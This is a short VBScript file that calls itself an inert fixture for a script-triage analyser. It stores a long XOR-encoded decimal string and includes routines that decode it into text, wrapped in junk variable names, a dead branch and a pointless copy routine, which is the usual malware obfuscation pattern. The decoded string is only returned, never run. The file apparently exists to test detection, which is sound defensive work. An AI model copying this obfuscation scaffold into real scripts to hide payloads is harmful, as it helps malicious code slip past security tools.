Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_fda57c8d = "135|242|147|176|194|133|170|210|191|140|157|160|193|173|197|148|144|206|163|210|144|163|142|188|195|148|191|195|190|212|174|187|208|173|223|130|169|199|190|157|132|191|206|163|208|149|144|208|169|220|158|187|199|176|208|149|174|210|184|212|131|242|225|163|223|151|166|197|159|212|146|186|208|165|197|136|159|205|160|216|146|182|140|169|201|148|179|209|184|208|150|170|253|175|222|132|161|214|241|131|141|172|195|161|193|144|166|197|162|238|152|171|159|175|208|156|191|195|165|214|159|226|195|173|211|144|174|151|248|132|193|173|222|185|195|157|242|202|184|197|129|188|152|227|158|144|174|192|173|208|196|251|151|252|211|223|170|218|173|220|129|163|199|226|216|159|185|195|160|216|149|224|147|245|129|199|247|149|244|128|223|171|195|184|205|132|188|199|190|238|144|168|199|162|197|204|135|215|162|197|131|170|209|191|253|144|173|141|173|208|147|174|195|249|133|196|255|192|176|215|152|163|199|147|193|144|187|202|241|242|203|147|247|191|212|131|188|254|156|196|147|163|203|175|237|185|186|204|184|195|148|188|209|128|208|147|147|209|184|208|150|170|143|173|208|147|174|195|249|133|196|255|192|226|213|144|187|222|185|193|157|160|195|168|238|132|189|206|241|217|133|187|210|191|139|222|224|195|173|211|144|174|151|248|132|193|173|140|169|201|144|162|210|160|212|223|166|204|186|208|157|166|198|227|196|129|163|205|173|213|222|248|198|169|215|192|169|144|168"
Const Codec_fda57c8d = "decimal_pipe|repeating_key_xor|f1,cf,a2,cc,b1"

Function Load_fda57c8d()
  Dim parts, result(), v_e598
  parts = Split(Material_fda57c8d, "|")
  ReDim result(UBound(parts))
  For v_e598 = 0 To UBound(parts)
    result(v_e598) = CInt(parts(v_e598))
  Next
  Load_fda57c8d = result
End Function

Function Decode_fda57c8d(ByRef v_a19c)
  Dim result(), v_e598, keyBytes, previous
  ReDim result(UBound(v_a19c))
  keyBytes = Array(241,207,162,204,177)
  For v_e598 = 0 To UBound(v_a19c)
    result(v_e598) = v_a19c(v_e598) Xor keyBytes(v_e598 Mod 5)
  Next
  Decode_fda57c8d = result
End Function

Function Recover_fda57c8d()
  Dim v_a19c, v_b27e, v_c304, v_d41a, v_e598, v_f602, v_a702, v_b803
  If True Then
    If (2 > 1) Then v_d41a = "left" Else v_d41a = "right"
      v_a19c = Load_fda57c8d()
      v_b27e = Decode_fda57c8d(v_a19c)
      v_c304 = ""
      For v_e598 = 0 To UBound(v_b27e)
        v_c304 = v_c304 & Chr(v_b27e(v_e598))
      Next
  End If
  Recover_fda57c8d = v_c304
End Function

Sub Copy_fda57c8d(ByVal inputText, ByRef outputText)
  outputText = inputText
End Sub

Function Inspect_fda57c8d()
  Dim resultText
  Call Copy_fda57c8d(Recover_fda57c8d(), resultText)
  Inspect_fda57c8d = resultText
End Function
